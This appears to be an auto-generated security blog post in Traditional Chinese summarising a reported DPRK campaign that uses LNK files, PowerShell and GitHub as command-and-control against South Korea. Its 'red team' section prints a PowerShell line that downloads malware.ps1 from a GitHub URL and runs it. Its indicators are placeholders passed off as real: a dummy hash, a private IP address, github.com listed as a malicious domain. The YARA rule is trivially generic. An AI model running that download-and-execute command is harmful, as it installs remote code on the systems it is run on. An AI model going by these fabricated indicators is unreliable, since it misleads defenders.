---
layout: post
title:  "DPRK-Linked Hackers Use GitHub as C2 in Multi-Stage Attacks Targeting South Korea"
date:   2026-04-06 18:48:01 +0000
categories: [security]
severity: high
---

# 🔥 解析北韓駭客利用 GitHub 進行 C2 通信的技術細節

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: PowerShell, GitHub, LNK 文件, VBScript

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 北韓駭客利用 GitHub 作為 C2 伺服器，透過 PowerShell 腳本下載和執行惡意程式碼。
* **攻擊流程圖解**:
  1.駭客發送含有 LNK 文件的電子郵件給受害者。
  2.受害者開啟 LNK 文件，觸發 PowerShell 腳本下載和執行惡意程式碼。
  3.惡意程式碼建立持續性，透過 GitHub 下載和執行額外的模組或指令。
* **受影響元件**: Windows 10, PowerShell 5.1, GitHub

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 受害者必須具有 Windows 10 和 PowerShell 5.1。
* **Payload 建構邏輯**:

    ```
    
    powershell
    # 下載和執行惡意程式碼
    Invoke-WebRequest -Uri "https://github.com/motoralis/malware/blob/main/malware.ps1" -OutFile "C:\temp\malware.ps1"
    Invoke-Command -ScriptBlock { & "C:\temp\malware.ps1" }
    
    ```
* **繞過技術**: 駭客使用 GitHub 作為 C2 伺服器，透過 PowerShell 腳本下載和執行惡意程式碼，避免了傳統的惡意程式碼下載和執行方式。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | 1234567890abcdef |
| IP | 192.168.1.100 |
| Domain | github.com |
| File Path | C:\temp\malware.ps1 |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Malware_Detection {
      meta:
        description = "Detects malware.ps1"
      strings:
        $a = "Invoke-WebRequest"
        $b = "Invoke-Command"
      condition:
        all of them
    }
    
    ```
* **緩解措施**: 更新 PowerShell 至最新版本，啟用 PowerShell 腳本簽名，限制 GitHub 存取。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **PowerShell**: 一種由 Microsoft 開發的腳本語言和命令列 shell。
* **GitHub**: 一種版本控制系統和代碼共享平台。
* **LNK 文件**: 一種 Windows 檔案格式，包含指向其他檔案或程式的連結。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/04/dprk-linked-hackers-use-github-as-c2-in.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1059/)


